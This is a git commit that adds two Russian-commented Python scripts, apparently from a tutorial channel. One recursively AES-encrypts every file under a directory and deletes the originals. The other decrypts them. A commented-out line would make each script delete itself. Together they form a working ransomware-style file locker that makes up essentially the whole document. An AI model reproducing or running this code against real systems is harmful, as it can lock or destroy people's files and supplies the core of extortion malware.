ffc5d754cd192febc903162c5460f05f51a5c5f2
pythontoday <pythontodaynet@gmail.com>
2020-07-22 18:13:57 +0700

    Initial commit

---
+++ decryption.py
@@ -0,0 +1,45 @@
+import pyAesCrypt
+import os
+import sys
+
+# функция дешифровки файла
+def decryption(file, password):
+
+    # задаём размер буфера
+    buffer_size = 512 * 1024
+
+    # вызываем метод расшифровки
+    pyAesCrypt.decryptFile(
+        str(file),
+        str(os.path.splitext(file)[0]),
+        password,
+        buffer_size
+    )
+
+    # чтобы видеть результат выводим на печать имя зашифрованного файла
+    print("[Файл '" + str(os.path.splitext(file)[0]) + "' дешифрован]")
+
+    # удаляем исходный файл
+    os.remove(file)
+
+# функция сканирования директорий
+def walking_by_dirs(dir, password):
+
+    # перебираем все поддиректории в указанной директории
+    for name in os.listdir(dir):
+        path = os.path.join(dir, name)
+
+        # если находим файл, то дешифруем его
+        if os.path.isfile(path):
+            try:
+                decryption(path, password)
+            except Exception as ex:
+                print(ex)
+        # если находим директорию, то повторяем цикл в поисках файлов
+        else:
+            walking_by_dirs(path, password)
+
+
+password = input("Введите пароль для расшифровки: ")
+walking_by_dirs("path", password)
+# os.remove(str(sys.argv[0]))
---
+++ encryption.py
@@ -0,0 +1,47 @@
+import pyAesCrypt
+import os
+import sys
+
+
+# функция шифрования файла
+def encryption(file, password):
+
+    # задаём размер буфера
+    buffer_size = 512 * 1024
+
+    # вызываем метод шифрования
+    pyAesCrypt.encryptFile(
+        str(file),
+        str(file) + ".crp",
+        password,
+        buffer_size
+    )
+
+    # чтобы видеть результат выводим на печать имя зашифрованного файла
+    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")
+
+    # удаляем исходный файл
+    os.remove(file)
+
+# функция сканирования директорий
+def walking_by_dirs(dir, password):
+
+    # перебираем все поддиректории в указанной директории
+    for name in os.listdir(dir):
+        path = os.path.join(dir, name)
+
+        # если находим файл, то шифруем его
+        if os.path.isfile(path):
+            try:
+                encryption(path, password)
+            except Exception as ex:
+                print(ex)
+        # если находим директорию, то повторяем цикл в поисках файлов
+        else:
+            walking_by_dirs(path, password)
+
+
+password = input("Введите пароль для шифрования: ")
+walking_by_dirs("path", password)
+# os.remove(str(sys.argv[0]))
+
